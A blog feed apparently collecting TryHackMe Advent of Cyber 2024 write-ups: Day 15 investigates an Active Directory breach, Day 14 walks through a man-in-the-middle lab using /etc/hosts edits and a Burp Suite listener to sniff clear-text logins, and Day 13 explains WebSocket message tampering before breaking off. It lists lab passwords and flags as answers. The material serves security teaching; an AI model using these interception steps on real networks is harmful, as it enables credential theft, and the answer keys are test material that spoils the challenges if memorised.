<span class="nx">krbtgt</span>         <span class="nx">krbtgt</span>         <span class="nx">CN</span><span class="o">=</span><span class="nx">Denied</span> <span class="nx">RODC</span> <span class="nx">Password</span> <span class="nx">Replication</span> <span class="nx">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span>
<span class="nx">tryhackme</span>      <span class="nx">tryhackme</span>      <span class="nx">CN</span><span class="o">=</span><span class="nx">Domain</span> <span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span>
<span class="nx">DAVID</span>          <span class="nx">DAVID</span>
<span class="nx">James</span>          <span class="nx">James</span>
<span class="nx">NewAccount</span>     <span class="nx">NewAccount</span>
<span class="nx">cmnatic</span>        <span class="nx">cmnatic</span>        <span class="p">{</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Domain</span> <span class="nx">Admins</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span><span class="p">,</span> <span class="nx">CN</span><span class="o">=</span><span class="nx">Remote</span> <span class="nx">Desktop</span> <span class="nx">Users</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Builtin</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">wareville</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">thm</span><span class="p">}</span>
</code></pre></div></div>

<p>\n</p>

<h2 id="reviewingpowershellhistory-and-logs">Reviewing PowerShell History and Logs</h2>

<p>PowerShell, like Bash on Linux, keeps a history of the commands inputted into the session. Reviewing these can be a fantastic way to see recent actions taken by the user account on the machine.</p>

<p>On a Windows Server, this history file  is located at <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730974418051.png" alt="Location of the PowerShell history file on the system." /> \n</p>

<p>You can use the in-built Notepad on Windows or your favourite text editor to review the PowerShell command history.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730974099222.png" alt="Contents of the PowerShell command logs." /></p>

<p>Additionally, logs are recorded for every PowerShell process executed on a system. These logs are located within the Event Viewer under <code class="language-plaintext highlighter-rouge">Application and Services Logs -&gt; Microsoft -&gt; Windows -&gt; PowerShell -&gt; Operational</code> or also under <code class="language-plaintext highlighter-rouge">Application and Service Logs -&gt; Windows PowerShell</code>. The logs have a wealth of information useful for incident response.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1732022781823.png" alt="Event Viewer showing PowerShell logs recorded." /></p>

<h2 id="practical">Practical</h2>

<p>Your task for today is to investigate WareVille’s SOC-mas Active Directory controller for the suspected breach.</p>

<h2 id="answer-the-questions-below-to-confirm-the-details-of-the-breach">Answer the questions below to confirm the details of the breach.</h2>

<h3 id="answer-the-questions-below">Answer the questions below</h3>

<p>Use the “Security” tab within Event Viewer to answer questions 1 and 2.</p>

<p>Complete</p>

<p>On what day was Glitch_Malware last logged in?
Answer format: DD/MM/YYYY
07/11/2024</p>

<p>What event ID shows the login of the Glitch_Malware user?
4624</p>

<p>Read the PowerShell history of the Administrator account. What was the command that was used to enumerate Active Directory users?
Get-ADUser -Filter * -Properties MemberOf | Select-Object Name</p>

<p>Look in the PowerShell log file located in <code class="language-plaintext highlighter-rouge">Application and Services Logs -&gt; Windows PowerShell</code>. What was Glitch_Malware’s set password?
SuperSecretP@ssw0rd!</p>

<p>Review the Group Policy Objects present on the machine. What is the name of the installed GPO?
Malicious GPO - Glitch_Malware Persistence</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/activedirectoryhardening">Active Directory Hardening </a>room.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day15Header.png" /><media:content medium="image" url="http://localhost:4000/Day15Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 14</title><link href="http://localhost:4000/Day14" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 14" /><published>2024-12-14T00:00:00-05:00</published><updated>2024-12-14T00:00:00-05:00</updated><id>http://localhost:4000/Day14</id><content type="html" xml:base="http://localhost:4000/Day14"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731812568781.svg" alt="Task banner for day 14" /></p>

<p><em>“It’s the Mayor” said the Glitch, he said it while sighing,</em></p>

<p><em>“The people of Wareville, their browsing he’s spying!”</em></p>

<p><em>“That sounds like him”, McSkidy then said,</em></p>

<p><em>“Back to work then”, while scratching her head.</em></p>

<p>It’s a quiet morning in the town of Wareville. A wholesome town where cheer and tech come together. McSkidy is charged to protect the GiftScheduler, the service elves use to schedule all the presents to be delivered in Wareville. She assigned Glitch to the case to make sure the site is secure for G-Day (Gift Day). In the meantime, Mayor Malware works tirelessly, hoping to not only ruin Christmas by redirecting presents to the wrong addresses but also to ensure that Glitch is blamed for the attack. After all, Glitch’s warnings about the same vulnerabilities Mayor Malware is exploiting make the hacker an easy scapegoat.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<p>In today’s task you will learn about:</p>

<ul>
  <li>Self-signed certificates</li>
  <li>Man-in-the-middle attacks</li>
  <li>Using Burp Suite proxy to intercept traffic</li>
</ul>

<h2 id="certified-to-sleigh">Certified to Sleigh</h2>

<p>We hear a lot about certificates and their uses, but let’s start dissecting what a certificate is:</p>

<ul>
  <li><strong>Public key</strong>: At its core, a certificate contains a public key, part of a pair of cryptographic keys: a public key and a private key. The public key is made available to anyone and is used to encrypt data.</li>
  <li><strong>Private key</strong>: The private key remains secret and is used by the website or server to decrypt the data.</li>
  <li><strong>Metadata</strong>: Along with the key, it includes metadata that provides additional information about the certificate holder (the website) and the certificate. You usually find information about the Certificate Authority (CA), subject (information about the website, e.g. www.meow.thm), a uniquely identifiable number, validity period, signature, and hashing algorithm.</li>
</ul>

<h2 id="sign-here-trust-me">Sign Here, Trust Me</h2>

<p>So what is a Certificate Authority (CA)?</p>

<p>A CA is a trusted entity that issues certificates; for example, GlobalSign, Let’s Encrypt, and DigiCert are very common ones. The browser trusts these entities and performs a series of checks to ensure it is a trusted CA. Here is a breakdown of what happens with a certificate:</p>

<ul>
  <li><strong>Handshake</strong>: Your browser requests a secure connection, and the website responds by sending a certificate, but in this case, it only requires the public key and metadata.</li>
  <li><strong>Verification:</strong> Your browser checks the certificate for its validity by checking if it was issued by a trusted CA. If the certificate hasn’t expired or been tampered with, and the CA is trusted, then the browser gives the green light. There are different types of checks you can do; check them <a href="https://www.sectigo.com/resource-library/dv-ov-ev-ssl-certificates">here</a>.</li>
  <li><strong>Key exchange</strong>: The browser uses the public key to encrypt a session key, which encrypts all communications between the browser and the website.</li>
  <li><strong>Decryption</strong>: The website (server) uses its private key to decrypt the session key, which is <a href="https://deviceauthority.com/symmetric-encryption-vs-asymmetric-encryption/">symmetric</a>. Now that both the browser and the website share a secret key (session key), we have established a secure and encrypted communication!</li>
</ul>

<p>Ever wonder what makes HTTPS be S (secure)? Thanks to certificates, we can now have authentication, encryption, and data integrity.</p>

<p><strong>Self-Signed Certificates vs. Trusted CA Certificates</strong></p>

<p>The process of acquiring a certificate with a CA is long, you create the certificate, and send it to a CA to sign it for you. If you don’t have tools and automation in place, this process can take weeks. Self-signed certificates are signed by an entity usually the same one that authenticates. For example, Wareville owns the GiftScheduler site, and if they create a certificate and sign it with Wareville as a CA, that becomes a self-signed certificate.</p>

<ul>
  <li><strong>Browsers</strong> generally do not trust self-signed certificates because there is no third-party verification. The browser has no way of knowing if the certificate is authentic or if it’s being used for malicious purposes (like a <strong>man-in-the-middle attack</strong>).</li>
  <li><strong>Trusted CA certificates</strong>, on the other hand, are verified by a CA, which acts as a trusted third party to confirm the website’s identity.</li>
</ul>

<p>CA-issued certificates sometimes take a long time; if you want to test a development environment, it can make sense to use self-signed certificates. Ideally, this is an internal, air-gapped environment with no connection to the public Internet. Otherwise, it defeats the purpose of a certificate: the entire system of secure communication relies on the fact that both parties (the browser and the server) can trust the data being exchanged and that no one in the middle can intercept or modify it without detection.</p>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below: \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376755339.png" alt="We need to start the AttackBox and the attached VM" /> \n</p>

<p>To reproduce Mayor Malware’s attack, click the <strong>Start Machine</strong> button below to deploy our target VM that has the Gift Scheduler server running.</p>

<p>Start Machine</p>

<p>Then click on the <strong>Start AttackBox</strong> button at the top of the page to start the machine from which we—along with Mayor Malware—will attack the website. The AttackBox machine will start in split view. If it is not visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>

<h2 id="how-mayor-malware-disrupts-g-day">How Mayor Malware Disrupts G-Day</h2>

<p>There are less than two weeks until G-Day, and Mayor Malware has been planning its disruption ever since Glitch raised the self-signed certificate vulnerability to McSkidy during a security briefing the other day.</p>

<p>His plan is near perfect. He will hack into the Gift Scheduler and mess with the delivery schedule. No one will receive the gift destined for them: G-Day will be ruined! [<em>evil laugh</em>]</p>

<p><strong>Preparation</strong></p>

<p>First things first: the Glitch spoke about a self-signed certificate, but Mayor Malware can’t believe that the townspeople—usually so security-savvy it’s maddening to him—would easily disregard such a critical vulnerability. Is it a trap set up by the Glitch and McSkidy to catch him red-handed? He definitely needs to check for himself.</p>

<p>Before that, though, he wants to make sure that his tracks are well covered. To prevent any DNS logs from alerting his enemies, he will resolve the Gift Scheduler’s FQDN locally on his machine.</p>

<p>To achieve this, let’s add the following line to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on the AttackBox: <code class="language-plaintext highlighter-rouge">MACHINE_IP gift-scheduler.thm</code></p>

<p>We can use the following command:</p>

<p>Terminal
root@attackbox:~# echo “MACHINE_IP gift-scheduler.thm” » /etc/hosts
To verify that the line above was added to the file, we can execute the following:</p>

<p>Terminal
root@attackbox:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       tryhackme.lan   tryhackme</p>

<h1 id="the-following-lines-are-desirable-for-ipv6-capable-hosts">The following lines are desirable for IPv6 capable hosts</h1>

<p>::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
MACHINE_IP gift-scheduler.thm
Now, Mayor Malware can navigate to the Gift Scheduler website without leaving a trace on Wareville’s DNS logs.</p>

<p>Let’s open the Firefox browser and navigate to <code class="language-plaintext highlighter-rouge">https://gift-scheduler.thm</code>. We’ll be presented with the following warning page:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732081797042.png" alt="Firefox warning page titled 'Warning: Potential Security Risk Ahead'. The page displays two buttons, the first one labelled 'Go Back (Recommended)' and the second labelled 'Advanced'. A yellow box highlights the 'Advanced' button." /></p>

<p>We can click on the <code class="language-plaintext highlighter-rouge">Advanced</code> button to expand the warning’s details.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732081843216.png" alt="Firefox warning page titled 'Warning: Potential Security Risk Ahead' showing advanced information. The details show that the host 'gift-scheduler.thm' uses a self-signed certificate. Two yellow boxes highlight a 'View Certificate' link, marked with number 1, and a button labelled 'Accept the Risk and Continue', marked with number 2." /></p>

<p>When we click on the <code class="language-plaintext highlighter-rouge">View Certificate</code> link marked with a 1 in the screenshot above, a new tab opens with the certificate details.</p>

<p>Mayor Malware can’t believe his luck! This is evidence that the Glitch was speaking the truth: the Gift Scheduler web server uses a self-signed certificate.</p>

<p>This means that the townspeople and all the elves will be used to clicking on the <code class="language-plaintext highlighter-rouge">Accept the Risk and Continue</code> button (marked with 2 on the screenshot above) to access the website, to the point it’s become a habit.</p>

<p>Mayor Malware does just that and inserts his credentials into the login form.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>mayor_malware</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>G4rbag3Day</td>
    </tr>
  </tbody>
</table>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732081963686.png" alt="Website login page" /></p>

<p>With his credentials, he can’t do anything but send a gift request—as if he were to ever do such a sickeningly sweet gesture. To carry out his evil plan, he will need to sniff some admin credentials. Maybe some of the elves’ passwords. Or even—if he gets lucky—Marta May Ware’s account!</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732081963676.png" alt="The 'Schedule your gift' form page" /></p>

<p>To sniff the elves’ traffic, the next step will be to start a proxy on his machine and route all of Wareville’s traffic to it. This way, the <strong>Mayor</strong> will be <strong>In The Middle</strong> between the townspeople and the Gift Scheduler. This position will allow him to sniff all requests forwarded to the sickening website.</p>

<p>Let’s start the Burp Suite proxy by typing <code class="language-plaintext highlighter-rouge">burp</code> in the terminal. A new window will open. We can accept the default configuration by clicking on <code class="language-plaintext highlighter-rouge">Next</code>, then <code class="language-plaintext highlighter-rouge">Start Burp</code> in the next window.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732082529688.png" alt="Burp Suite window. Three numbered yellow boxes highlight the following: 1-the Proxy tab; 2-an Intercept On button; 3-a Proxy Settings menu." /></p>

<p>Once Burp Suite loads, we will select <code class="language-plaintext highlighter-rouge">Proxy</code> (number 1 in the screenshot above) and then toggle off the <code class="language-plaintext highlighter-rouge">Intercept on</code> option (number 2) to prevent users from noticing any delays in the website responses. Finally, let’s open the <code class="language-plaintext highlighter-rouge">Proxy Settings</code> (number 3) to set a new listener on our AttackBox IP address.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732082054712.png" alt="Burp Suite settings window open on the Proxy settings. A yellow box highlights a button labelled “Add” under the Proxy listeners section." /></p>

<p>We can click on the <code class="language-plaintext highlighter-rouge">Add</code> button highlighted in the screenshot above. Burp Suite will prompt us for the new listener’s configuration.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732082457072.png" alt="Burp Suite window labelled 'Add a proxy listener' open on the 'Binding' tab. The number 8080 is written in the box next to a 'Bind to port' option. Under the 'Bind to address' section, the 'Specific address' option is selected. A partially covered IP address is specified in a dropdown box. A yellow box highlights the 'OK' button on the lower right." /></p>

<p>We must set the listening port to <code class="language-plaintext highlighter-rouge">8080</code> and toggle the <code class="language-plaintext highlighter-rouge">Specific address</code> option. The box next to it will automatically specify the IP address of our AttackBox, <code class="language-plaintext highlighter-rouge">CONNECTION_IP</code>. Finally, we can click on <code class="language-plaintext highlighter-rouge">OK</code> to apply the configuration.</p>

<p>The previous settings window will get displayed and we can see that the new listener has been added under the proxy listeners list.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732081911457.png" alt="The Burp Suite settings window open on the Proxy settings. A new listener is now listed under the Proxy listeners section. A yellow box highlights the phrase: Each installation of Burp generates its own CA certificate that Proxy listeners can use when negotiating TLS connections." /></p>

<p>Mayor Malware rubs his hands together gleefully: as we can read in the yellow box in the screenshot above, Burp Suite already comes with a self-signed certificate. The users will be prompted to accept it and continue, and Mayor Malware knows they will do it out of habit, without even thinking of verifying the certificate origin first. The G-Day disruption operation will go off without a hitch!</p>

<p><strong>Sniff From The Middle</strong></p>

<p>Now that our machine is ready to listen, we must reroute all Wareville traffic to our machine.</p>

<p>Mayor Malware has a wonderful idea to achieve this: he will set his own machine as a gateway for all other Wareville’s machines!</p>

<p>Let’s add another line to the AttackBox’s <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. <strong>Note:</strong> The <code class="language-plaintext highlighter-rouge">CONNECTION_IP</code> address in the snippet should reflect the IP of our AttackBox, which can be found at the top of the page.</p>

<p>Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">echo</span> <span class="dl">"</span><span class="s2">CONNECTION_IP wareville-gw</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="nx">hosts</span>
</code></pre></div></div>

<p>This will divert all of Wareville’s traffic, usually routed through the legitimate Wareville Gateway, to Mayor Malware’s machine, effectively putting him “In The Middle” of the requests. <strong>Note:</strong> In practice, the adversary can launch a similar attack if they can control the user’s gateway and their attack can easily succeed against websites not using properly signed certificates. This attack requires more than adding an entry into the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file; however, this task aims to emulate parts of the attack.</p>

<p>As a last step, we must start a custom script to simualte the users’ requests to the Gift Scheduler. <strong>Note:</strong> Keep the script running so that new user requests will constantly be captured in Burp Suite.</p>

<p>Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">cd</span> <span class="o">~</span><span class="sr">/Rooms/</span><span class="nx">AoC2024</span><span class="o">/</span><span class="nx">Day14</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="sr">/Rooms/</span><span class="nx">AoC2024</span><span class="o">/</span><span class="nx">Day14</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="nx">route</span><span class="o">-</span><span class="nx">elf</span><span class="o">-</span><span class="nx">traffic</span><span class="p">.</span><span class="nx">sh</span>
<span class="nx">Verifying</span> <span class="nx">archive</span> <span class="nx">integrity</span><span class="p">...</span>  <span class="mi">100</span><span class="o">%</span>   <span class="nx">MD5</span> <span class="nx">checksums</span> <span class="nx">are</span> <span class="nx">OK</span><span class="p">.</span> <span class="nx">All</span> <span class="nx">good</span><span class="p">.</span>
<span class="nx">Uncompressing</span> <span class="nx">Intercept</span> <span class="nx">Traffic</span>  <span class="mi">100</span><span class="o">%</span>
<span class="nx">Intercepting</span> <span class="nx">user</span> <span class="nx">traffic</span> <span class="k">in</span> <span class="nx">progress</span><span class="p">...</span>
 <span class="nx">User</span> <span class="nx">request</span> <span class="nx">intercepted</span> <span class="nx">successfully</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">11</span> <span class="mi">16</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">56</span>
 <span class="nx">User</span> <span class="nx">request</span> <span class="nx">intercepted</span> <span class="nx">successfully</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">11</span> <span class="mi">16</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">23</span>
 <span class="nx">User</span> <span class="nx">request</span> <span class="nx">intercepted</span> <span class="nx">successfully</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">11</span> <span class="mi">16</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">36</span>
<span class="p">[...]</span>
</code></pre></div></div>

<p><strong>Pwn the Scheduler</strong></p>

<p>At last, everything is in place. Mayor Malware’s evil plan can finally commence! [<em>evil laugh</em>]</p>

<p>We can return to the open Burp Suite window and click on the <code class="language-plaintext highlighter-rouge">HTTP History</code> tab.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732085268640.png" alt="HTTP history with some requests, one GET open." /></p>

<p>There is a triumphant gleam in Mayor Malware’s eyes while he stares intently at the web requests pouring on his screen. He can finally see them: the POST requests containing clear-text credentials for the Gift Scheduler website! Now, he only needs to wait and find the password to a privileged account.</p>

<h2 id="answer-the-questions-below">Answer the questions below</h2>

<p>What is the name of the CA that has signed the Gift Scheduler certificate?
THM</p>

<p>Look inside the POST requests in the HTTP history. What is the password for the <code class="language-plaintext highlighter-rouge">snowballelf</code> account?
c4rrotn0s3</p>

<p>Use the credentials for any of the elves to authenticate to the Gift Scheduler website. What is the flag shown on the elves’ scheduling page?
THM{AoC-3lf0nth3Sh3lf}</p>

<p>What is the password for Marta May Ware’s account?
H0llyJ0llySOCMAS</p>

<p>Mayor Malware finally succeeded in his evil intent: with Marta May Ware’s username and password, he can finally access the administrative console for the Gift Scheduler. G-Day is cancelled! What is the flag shown on the admin page?
THM{AoC-h0wt0ru1nG1ftD4y}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/learn-burp-suite">Burp Suite</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day14Header.png" /><media:content medium="image" url="http://localhost:4000/Day14Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 13</title><link href="http://localhost:4000/Day13" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 13" /><published>2024-12-13T00:00:00-05:00</published><updated>2024-12-13T00:00:00-05:00</updated><id>http://localhost:4000/Day13</id><content type="html" xml:base="http://localhost:4000/Day13"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731326932593.png" alt="Task banner for day DAY 13" /></p>

<p><em>This SOC-mas was packed with exploits and hacking,</em></p>

<p><em>Today’s threat - an app, which allows Wares’ car tracking.</em></p>

<p><em>Mayor Malware, no doubt, well that’s their suspicion!</em></p>

<p><em>For Glitch and McSkidy, the proof was their mission.</em></p>

<p>\n</p>

<p>Wares are all about security. The Glitch discovers that an app is illegally tracking the cars in Wareville. Not many car thefts in the city warrant such an extreme measure. He reaches out to McSkidy to investigate and identify how the application is tracking them and leaking users’ positions. \n</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Learn about WebSockets and their vulnerabilities.</li>
  <li>Learn how WebSocket Message Manipulation can be done.</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card below and start the virtual machine by pressing the <strong>Start Machine</strong> button. The VM should be fully loaded in 3 minutes. Additionally, you will need the AttackBox, which can be launched by clicking the <strong>Start AttackBox</strong> button at the top of the page.</p>

<p>Start Machine</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730200909294.png" alt="Banner showing connection options provided in this room." /></p>

<h2 id="introduction-to-websocket">Introduction to WebSocket</h2>

<p>WebSockets let your browser and the server keep a constant line of communication open. Unlike the old-school method of asking for something, getting a response, and then hanging up, WebSockets are like keeping the phone line open so you can chat whenever you need to. Once that connection is set up, the client and server can talk back and forth without all the extra requests.</p>

<p>WebSockets are great for live chat apps, real-time games, or any live data feed where you want constant updates. After a quick handshake to get things started, both sides can send messages whenever. This means less overhead and faster communication when you need data flowing in real-time.</p>

<h2 id="traditionalhttprequests-vs-websocket">Traditional HTTP Requests vs. WebSocket</h2>

<p>When you use regular HTTP, your browser sends a request to the server, and the server responds, then closes the connection. If you need new data, you have to make another request. Think of it like knocking on someone’s door every time you want something—they’ll answer, but it can get tiring if you need updates constantly.</p>

<p>Take a chat app as an example. With HTTP, your browser would keep asking, “Any new messages?” every few seconds. This method, known as polling, works but isn’t efficient. Both the browser and the server end up doing a lot of unnecessary work just to stay updated.</p>

<p>WebSockets handle things differently. Once the connection is established, it remains open, allowing the server to push updates to you whenever there’s something new. It’s more like leaving the door open so updates can come in immediately without the constant back-and-forth. This approach is faster and uses fewer resources.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731327387327.png" alt="Glitch and McSkidy simulating a communication channel using a game of foot-volley." /></p>

<h2 id="websocket-vulnerabilities">WebSocket Vulnerabilities</h2>

<p>While WebSockets can boost performance, they also come with security risks that developers need to monitor. Since WebSocket connections stay open and active, they can be taken advantage of if the proper security measures aren’t in place. Here are some common vulnerabilities:</p>

<ul>
  <li><strong>Weak Authentication and Authorisation:</strong> Unlike regular HTTP, WebSockets don’t have built-in ways to handle user authentication or session validation. If you don’t set these controls up properly, attackers could slip in and get access to sensitive data or mess with the connection.</li>
  <li><strong>Message Tampering:</strong> WebSockets let data flow back and forth constantly, which means attackers could intercept and change messages if encryption isn’t used. This could allow them to inject harmful commands, perform actions they shouldn’t, or mess with the sent data.</li>
  <li><strong>Cross-Site WebSocket Hijacking (CSWSH):</strong> This happens when an attacker tricks a user’s browser into opening a WebSocket connection to another site. If successful, the attacker might be able to hijack that connection or access data meant for the legitimate server.</li>
  <li><strong>Denial of Service (DoS):</strong> Because WebSocket connections stay open, they can be targeted by DoS attacks. An attacker could flood the server with a ton of messages, potentially slowing it down or crashing it altogether.</li>
</ul>

<h2 id="what-is-websocket-message-manipulation">What Is WebSocket Message Manipulation?</h2>

<p>WebSocket Message Manipulation is when an attacker intercepts and changes the messages sent between a web app and its server. Unlike regular HTTP requests that go back and forth one at a time, WebSockets keep a connection open, allowing constant two-way communication. This is what makes WebSockets great for real-time apps, but it also opens the door for attacks if proper security isn’t in place.</p>

<p>In this type of attack, a hacker could intercept and tweak these WebSocket messages as they’re being sent. Let’s say the app is sending sensitive info, like transaction details or user commands—an attacker could change those messages to make the app behave differently. They could bypass security checks, send unauthorised requests, or alter key data like usernames, payment amounts, or access levels.</p>

<p>For example, imagine a web app using WebSockets to handle money transfers between accounts. If an attacker gets hold of the message before it hits the server, they could change the amount being transferred or even send the money to a different account. Since WebSocket connections happen in real-time, these changes would take effect instantly without the user or server noticing immediately.</p>

<p>This kind of manipulation can also lead to more significant problems. Hackers could inject harmful code or try to get higher-level access. For instance, they might change a message to give themselves admin rights or insert malicious commands to take control of the server.</p>

<p>What makes this attack so dangerous is that WebSocket connections often don’t have the same security protections as traditional HTTP connections, like End-to-End Encryption, which encrypts the request body of an HTTP request using JavaScript using an AES key or RSA public key stored in the JavaScript file. If developers don’t add vigorous checks like message validation or encryption, it’s easy for attackers to exploit these gaps. By tampering with the data being sent, attackers can cause all sorts of damage, from unauthorised actions to full system compromises.</p>

<p>The impact of changing WebSocket messages depends on how the app uses them and what kind of data is being sent. Here’s a breakdown of what can happen:</p>

<ul>
  <li><strong>Doing Things Without Permission:</strong> If someone can tamper with WebSocket messages, they could impersonate another user and carry out unauthorised actions such as making purchases, transferring funds, or changing account settings. For example, if a WebSocket manages payment transactions, an attacker could manipulate the transaction amount or reroute the payment to their own account.</li>
  <li><strong>Gaining Extra Privileges:</strong> Attackers could also manipulate messages to make the system think they have more privileges than they actually do. This could let them access admin controls, change user data, view sensitive info, or mess with system settings.</li>
  <li><strong>Messing Up Data:</strong> One of the significant risks is data corruption. If someone is changing the messages, they could feed bad data into the system. This could mess with user accounts, transactions, or anything else the app handles. They could change things in real-time and disrupt everyone’s work in circumstances such as a shared document or tool.</li>
  <li><strong>Crashing the System:</strong> An attacker could also spam the server with bad requests, causing it to slow down or crash. If this happens enough, the system could go offline, causing serious downtime for users and businesses.</li>
</ul>

<p>Without good security checks, this kind of message tampering can lead to anything from unauthorised actions to the downing of an entire service.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Navigate to <a href="http://machine_ip/">http://MACHINE_IP</a>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732000113691.png" alt="Reindeer Tracker web app homepage." /></p>

<p>If you’re using the AttackBox, on your browser, make sure to proxy the traffic of the application, as shown below.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732000477479.png" alt="Initiating a proxy on the browser to capture web traffic." /></p>

